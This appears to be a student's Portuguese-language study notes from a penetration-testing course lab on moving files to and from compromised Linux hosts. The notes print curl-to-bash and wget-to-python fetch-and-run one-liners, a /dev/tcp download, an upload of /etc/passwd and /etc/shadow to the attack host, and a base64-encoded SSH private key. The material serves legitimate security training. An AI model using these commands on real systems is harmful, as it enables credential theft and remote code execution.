O Linux é um sistema operacional versátil com diversas ferramentas para transferências de arquivos, essenciais tanto para invasores quanto para defensores em suas atividades.

Em um caso de resposta a incidentes, foi descoberto que agentes de ameaça usaram uma vulnerabilidade de injeção de SQL para executar um script Bash que tentava baixar malware usando três métodos: `cURL`, `wget`, e Python, todos via HTTP.

Embora o Linux suporte outros protocolos como FTP e SMB, a maioria dos malwares utiliza HTTP e HTTPS. Esta seção explorará várias maneiras de transferir arquivos no Linux, incluindo HTTP, Bash, SSH, entre outros.

## Operações de download
Temos acesso à máquina `NIX04`e precisamos baixar um arquivo da nossa `Pwnbox`máquina. Vamos ver como podemos fazer isso usando vários métodos de download de arquivo.

![[Pasted image 20240823101632.png]]

## Codificação/Decodificação Base64
Dependendo do tamanho do arquivo que queremos transferir, podemos usar um método que não requer comunicação de rede. Se tivermos acesso a um terminal, podemos codificar um arquivo para uma string base64, copiar seu conteúdo para o terminal e executar a operação reversa. Vamos ver como podemos fazer isso com o Bash.

#### Pwnbox - Verificar hash MD5 do arquivo
```shell-session
NycolasES6@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Usamos `cat`para imprimir o conteúdo do arquivo e codificar a saída em base64 usando um pipe `|`. Usamos a opção `-w 0`de criar apenas uma linha e terminamos com o comando com um ponto e vírgula (;) e `echo`palavra-chave para iniciar uma nova linha e facilitar a cópia.

#### Pwnbox - Codificar chave SSH para Base64

```shell-session
NycolasES6@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=

```

Copiamos esse conteúdo, colamos na máquina de destino Linux e usamos `base64` e a opção `-d` para decodificá-lo.

#### Linux - Decodificar o arquivo
```shell-session
NycolasES6@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Por fim, podemos confirmar se o arquivo foi transferido com sucesso usando o comando `md5sum`.

#### Linux - Confirme a correspondência de hashes MD5

```shell-session
NycolasES6@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

>[!NOTE] **Nota:** Você também pode fazer upload de arquivos usando a operação reversa. Do seu alvo comprometido cat e base64 codifique um arquivo e decodifique-o no seu Pwnbox.

## Downloads da Web com Wget e cURL
Dois dos utilitários mais comuns em distribuições Linux para interagir com aplicativos web são `wget`e `curl`. Essas ferramentas são instaladas em muitas distribuições Linux.

Para baixar um arquivo usando `wget`, precisamos especificar a URL e a opção `-O` para definir o nome do arquivo de saída.

#### Baixar um arquivo usando wget
```shell-session
NycolasES6@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL`é muito semelhante a `wget`, mas a opção de nome de arquivo de saída é `-o` minúsculo.

#### Baixar um arquivo usando cURL
```shell-session
NycolasES6@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Ataques sem arquivo usando Linux
Devido à maneira como o Linux funciona e como [os pipes operam](https://www.geeksforgeeks.org/piping-in-unix-or-linux/) , a maioria das ferramentas que usamos no Linux podem ser usadas para replicar operações sem arquivo, o que significa que não precisamos baixar um arquivo para executá-lo.

>[!NOTE] Tenha em mente que, embora a execução do payload possa ser sem arquivo quando você usa um pipe, dependendo do payload escolhido, ele pode criar arquivos temporários no SO.

Vamos pegar o `cURL`comando que usamos e, em vez de baixar o LinEnum.sh, vamos executá-lo diretamente usando um pipe.

#### Download sem arquivo com cURL
```shell-session
NycolasES6@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarmente, podemos baixar um arquivo de script Python de um servidor web e canalizá-lo para o binário Python. Vamos fazer isso, dessa vez usando `wget`.

#### Download sem arquivo com wget
```shell-session
NycolasES6@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```


## Baixar com Bash (/dev/tcp)
Também pode haver situações em que nenhuma das ferramentas de transferência de arquivos bem conhecidas esteja disponível. Desde que o Bash versão 2.04 ou superior esteja instalado (compilado com --enable-net-redirections), o arquivo de dispositivo /dev/TCP integrado pode ser usado para downloads simples de arquivos.

#### Conecte-se ao servidor da Web de destino
```shell-session
NycolasES6@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### Solicitação HTTP GET
```shell-session
NycolasES6@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Imprimir a resposta
```shell-session
NycolasES6@htb[/htb]$ cat <&3
```

## Downloads SSH

**SSH** (Secure Shell) é um protocolo que permite o acesso seguro a computadores remotos, acompanhado pelo utilitário **SCP** para transferência segura de arquivos via linha de comando usando o protocolo SSH.

O **SCP** permite copiar arquivos e diretórios entre hosts locais e remotos, funcionando de maneira semelhante ao comando `cp`, mas exigindo a especificação de um nome de usuário, endereço IP ou nome DNS, e as credenciais do usuário.

Antes de baixar arquivos de uma máquina Linux para o Pwnbox, é necessário configurar um servidor SSH no Pwnbox.

#### Habilitando o servidor SSH
```shell-session
NycolasES6@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

#### Iniciando o servidor SSH
```shell-session
NycolasES6@htb[/htb]$ sudo systemctl start ssh
```

#### Verificando a porta de escuta SSH
```shell-session
NycolasES6@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Agora podemos começar a transferir arquivos. Precisamos especificar o endereço IP do nosso Pwnbox e o nome de usuário e senha.

#### Linux - Baixando arquivos usando SCP
```shell-session
NycolasES6@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Operações de upload
Há também situações como exploração binária e análise de captura de pacotes, onde precisamos carregar arquivos da nossa máquina alvo para o nosso host de ataque. Os métodos que usamos para downloads também funcionarão para uploads. Vamos ver como podemos carregar arquivos de várias maneiras.

## Carregamento da Web

Conforme mencionado na `Windows File Transfer Methods`seção, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver) , um módulo estendido do `HTTP.Server`módulo Python, que inclui uma página de upload de arquivo. Para este exemplo do Linux, vamos ver como podemos configurar o `uploadserver`módulo para usar `HTTPS`para comunicação segura.

A primeira coisa que precisamos fazer é instalar o `uploadserver`módulo.

#### Pwnbox - Iniciar Servidor Web
```shell-session
NycolasES6@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Agora precisamos criar um certificado. Neste exemplo, estamos usando um certificado autoassinado.

#### Pwnbox - Crie um certificado autoassinado
```shell-session
NycolasES6@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

O servidor web não deve hospedar o certificado. Recomendamos criar um novo diretório para hospedar o arquivo para nosso servidor web.

#### Pwnbox - Iniciar Servidor Web
```shell-session
NycolasES6@htb[/htb]$ mkdir https && cd https
```

```shell-session
NycolasES6@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Agora, da nossa máquina comprometida, vamos carregar os arquivos `/etc/passwd`e `/etc/shadow`.

#### Linux - Carregar vários arquivos
```shell-session
NycolasES6@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos essa opção `--insecure`porque usamos um certificado autoassinado em que confiamos.

## Método alternativo de transferência de arquivos da Web


Nas distribuições Linux, iniciar um servidor web para transferir arquivos é simples, especialmente porque muitas já têm Python ou PHP instalados. Se comprometemos um servidor web, podemos mover os arquivos desejados para o diretório do servidor web e acessá-los via página web, permitindo que baixemos os arquivos para o nosso Pwnbox.

Quando um servidor web não está instalado na máquina comprometida, podemos usar um mini servidor web. Embora possam ser menos seguros, esses servidores oferecem grande flexibilidade, permitindo mudanças rápidas no webroot e nas portas de escuta.

#### Linux - Criando um servidor web com Python3
```shell-session
NycolasES6@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Criando um servidor web com Python2.7
```shell-session
NycolasES6@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Criando um Servidor Web com PHP
```shell-session
NycolasES6@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Criando um Servidor Web com Ruby
```shell-session
NycolasES6@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

#### Baixe o arquivo da máquina de destino para o Pwnbox
```shell-session
NycolasES6@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

>[!NOTA] **Nota:** Quando iniciamos um novo servidor web usando Python ou PHP, é importante considerar que o tráfego de entrada pode ser bloqueado. Estamos transferindo um arquivo do nosso alvo para o host do ataque, mas não estamos carregando o arquivo.

## Carregar SCP
Podemos encontrar algumas empresas que permitem o `SSH protocol`(TCP/22) para conexões de saída, e se for esse o caso, podemos usar um servidor SSH com o `scp`utilitário para carregar arquivos. Vamos tentar carregar um arquivo para a máquina de destino usando o protocolo SSH.

#### Upload de arquivo usando SCP
```shell-session
NycolasES6@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd   
```





















































































































































